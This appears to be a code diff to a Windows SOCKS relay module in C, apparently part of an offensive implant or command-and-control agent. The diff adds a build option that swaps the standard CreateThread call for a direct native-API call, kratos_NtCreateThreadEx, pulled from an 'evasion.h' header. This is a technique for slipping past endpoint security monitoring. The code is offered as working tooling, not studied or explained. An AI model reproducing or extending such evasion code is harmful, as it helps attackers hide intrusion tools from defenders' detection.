@@ -3,6 +3,9 @@
 
 #include "socks.h"
 #include "utils.h"
+#ifdef EVASION_SYSCALLS
+#include "evasion.h"
+#endif
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -269,7 +272,14 @@ static void handle_connect(SocksConn *c, const unsigned char *data, size_t len) 
     enqueue_out(c->server_id, ok, 10, 0);
 
     // Lancer le thread de relay
+#ifdef EVASION_SYSCALLS
+    c->thread = NULL;
+    kratos_NtCreateThreadEx(&c->thread, THREAD_ALL_ACCESS, NULL,
+                             GetCurrentProcess(), (PVOID)relay_thread, c,
+                             0, 0, 0, 0, NULL);
+#else
     c->thread = CreateThread(NULL, 0, relay_thread, c, 0, NULL);
+#endif
     if (!c->thread) {
         closesocket(c->sock);
         c->sock  = INVALID_SOCKET;
